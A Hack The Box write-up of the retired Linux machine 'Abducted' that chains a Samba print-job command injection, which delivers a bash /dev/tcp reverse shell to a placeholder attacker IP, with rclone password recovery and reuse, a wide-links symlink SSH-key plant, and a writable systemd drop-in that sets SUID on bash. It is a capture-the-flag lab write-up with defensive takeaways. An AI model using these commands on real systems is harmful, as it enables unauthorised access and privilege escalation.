# Hack The Box — Abducted

> **Difficulty:** Medium · **OS:** Linux · **Status:** Retired
> Flags are intentionally **redacted** in accordance with the Hack The Box content policy.

Abducted is a Samba file/print server. A **print-spooler command injection**
(CVE-2026-4480) gives an unauthenticated shell as `nobody`; an **obfuscated rclone
password** is reused for SSH; a **wide-links symlink** on a `force user` share plants
an SSH key for a second user; and an **operators-group-writable systemd drop-in**
escalates to root.

```
recon (SMB) ──► print-injection RCE (CVE-2026-4480, nobody)
            └─► rclone.conf reveal ──► SSH as scott (user)
                                   └─► transfer share wide-links symlink ──► SSH as marcus
                                                                         └─► systemd drop-in (operators) ──► root
```

---

## 1. Recon

```bash
nmap -sC -sV -p- --min-rate 2000 10.129.X.X
```

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH 9.6p1 |
| 139,445/tcp | Samba smbd 4 — NetBIOS `ABDUCTED`, "Hartley Group Document Services" |

SMB enumeration:

```bash
smbclient -N -L //10.129.X.X
netexec smb 10.129.X.X -u guest -p '' --shares
rpcclient -U '' -N 10.129.X.X -c 'enumdomusers'
```

- Shares: `HP-Reception` (**Printer**, guest **WRITE**), `projects`, `transfer` (auth)
- User: `scott`

---

## 2. Foothold — Samba Print-Spooler Injection (CVE-2026-4480)

`shares.conf` defines the printer with a `print command` that expands the
client-controlled **job name** (`%J`) unsanitised:

```ini
[HP-Reception]
   path = /var/spool/samba
   printable = yes
   guest ok = yes
   print command = /usr/local/bin/printaudit %J %s
```

A print job whose **name** is `|sh` causes the spooled file to be piped to a shell.
Upload a file (its contents = commands to run) to the remote name `|sh`:

```bash
cat > shell.txt <<'EOF'
bash -c 'bash -i >& /dev/tcp/10.10.14.X/9001 0>&1'
EOF
smbclient //10.129.X.X/HP-Reception -N -c 'put shell.txt "|sh"'
# catch with:  nc -lvnp 9001
```

→ shell as `nobody`. Read the backup config:

```bash
cat /opt/offsite-backup/rclone.conf
```

```
[offsite]
type = sftp
user = svc-backup
pass = <obfuscated>
```

---

## 3. User — rclone Reveal + Password Reuse

rclone's `pass` is reversibly obfuscated, not encrypted:

```bash
rclone reveal <obfuscated>      # -> <redacted plaintext>
```

The password is reused for `scott`:

```bash
ssh scott@10.129.X.X            # user flag in ~/user.txt
```

---

## 4. Lateral — `transfer` Share Wide-Links Symlink → marcus

`shares.conf` for `transfer` combines two dangerous options:

```ini
[transfer]
   path = /srv/transfer
   valid users = scott
   force user = marcus          # all file ops run as marcus
   wide links = yes             # symlinks are followed off the share
```

`/srv/transfer` is owned by scott, so plant a symlink to marcus's home, then write an
`authorized_keys` through it over SMB (created as marcus thanks to `force user`):

```bash
ssh-keygen -t ed25519 -f marcus_key -N ''
cp marcus_key.pub authorized_keys
ssh scott@10.129.X.X 'ln -s /home/marcus /srv/transfer/marcus'
smbclient //10.129.X.X/transfer -U 'scott%<pw>' \
    -c 'cd marcus; mkdir .ssh; cd .ssh; put authorized_keys authorized_keys'
ssh -i marcus_key marcus@10.129.X.X
```

`marcus` is a member of the **`operators`** group.

---

## 5. Root — operators-Writable systemd Drop-in

The `smbd` service drop-in directory is group-writable by `operators`:

```bash
find / -group operators 2>/dev/null
# /etc/systemd/system/smbd.service.d   (drwxrws--- root operators)
```

Drop in an `ExecStartPre` that SUIDs bash, then restart the service (operators are
permitted to restart smbd):

```bash
printf '[Service]\nExecStartPre=/bin/bash -c "chmod +s /bin/bash"\n' \
    > /etc/systemd/system/smbd.service.d/privesc.conf
systemctl daemon-reload
systemctl restart smbd
bash -p            # euid=0 -> cat /root/root.txt
```

*(Clean up afterwards on shared instances: restore `/bin/bash` perms, remove the
drop-in and the symlink.)*

---

## Key Takeaways

- **Never expand client-controlled input in a `print command`** — `%J` job names must
  be treated as untrusted; this is a straight command injection.
- **rclone `pass` is obfuscation, not encryption** — anyone with the config recovers
  the plaintext with `rclone reveal`. Don't reuse it for real accounts.
- **`wide links = yes` + `force user`** turns a writable share into arbitrary file
  write as another user. Keep `wide links` off (and `unix extensions` on).
- **Group-writable unit/drop-in directories = root.** A writable `ExecStartPre`
  runs as the service user (root). Audit `find / -group <grp> -perm -g+w`.
